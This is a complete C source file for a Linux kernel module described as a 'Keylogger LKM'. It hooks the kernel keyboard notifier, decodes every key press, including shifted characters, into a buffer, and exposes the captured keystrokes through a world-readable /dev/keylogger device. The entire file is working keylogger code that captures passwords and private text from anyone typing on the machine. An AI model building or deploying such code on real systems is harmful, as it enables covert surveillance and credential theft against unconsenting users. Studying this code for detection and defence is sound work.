#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/rwlock_types.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/device.h>

#define DEVICE_NAME "keylogger"
#define CLASS_NAME  "keylogger"

MODULE_AUTHOR("Nick Bulischeck");
MODULE_DESCRIPTION("Keylogger LKM");
MODULE_LICENSE("GPL");

static int key_callback(struct notifier_block *, unsigned long, void *);

static struct notifier_block notifier = {
	.notifier_call = key_callback,
};

#define BUF_LEN 1024
static size_t buf_pos = 0;
static char keys_buf[BUF_LEN];

static int major;
static struct class  *char_class  = NULL;
static struct device *char_device = NULL;

static const char *keymap[][2] = {
	{NULL, NULL}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {NULL, NULL}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {NULL, NULL}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {NULL, NULL},
	{NULL, NULL}, {"F11", "F11"}, {"F12", "F12"}, {NULL, NULL},
	{NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL},
	{NULL, NULL}, {"\n", "\n"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {NULL, NULL},
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},
	{"_DEL_", "_DEL_"}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL},
	{NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL},
	{"_PAUSE_", "_PAUSE_"},
};

static const char *decode(int key, int shift){
	if(key > KEY_RESERVED && key <= KEY_PAUSE)
		return keymap[key][shift & 1];
	return NULL;
}

static int key_callback(struct notifier_block *nb, unsigned long code, void *p){
	size_t len;
	const char *keybuf;
	struct keyboard_notifier_param *param = p;

	if (!(param->down))
		return NOTIFY_OK;

	keybuf = decode(param->value, param->shift);
	if (keybuf == NULL)
		return NOTIFY_OK;

	len = strlen(keybuf);

	if ((buf_pos + len) >= BUF_LEN)
		buf_pos = 0;

	memcpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;

	return NOTIFY_OK;
}

static inline int dev_open(struct inode *inodep, struct file *filep){
	return 0;
}

static inline ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset){
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static inline ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset){
	return -EINVAL;
}

static inline int dev_release(struct inode *inodep, struct file *filep){
	return 0;
}

static struct file_operations fops = {
	.open = dev_open,
	.read = dev_read,
	.write = dev_write,
	.release = dev_release,
};

void exit_char_dev(void){
	device_destroy(char_class, MKDEV(major, 0));
	class_unregister(char_class);
	class_destroy(char_class);
	unregister_chrdev(major, DEVICE_NAME);
}

static char *set_mode_devnode(struct device *dev, umode_t *mode){
	if (mode)
		*mode = 0666;
	return NULL;
}

int init_char_dev(void){
	major = register_chrdev(0, DEVICE_NAME, &fops);
	if (major < 0){
		return major;
	}

	char_class = class_create(NULL, CLASS_NAME);
	if (IS_ERR(char_class)){
		unregister_chrdev(major, DEVICE_NAME);
		return PTR_ERR(char_class);
	}

	char_class->devnode = set_mode_devnode;

	char_device = device_create(char_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
	if (IS_ERR(char_device)){
		class_destroy(char_class);
		unregister_chrdev(major, DEVICE_NAME);
		return PTR_ERR(char_device);
	}
	return 0;
}

static int __init init_mod(void){
	register_keyboard_notifier(&notifier);
	return init_char_dev();
}

static void __exit exit_mod(void){
	unregister_keyboard_notifier(&notifier);
	exit_char_dev();
}

module_init(init_mod);
module_exit(exit_mod);
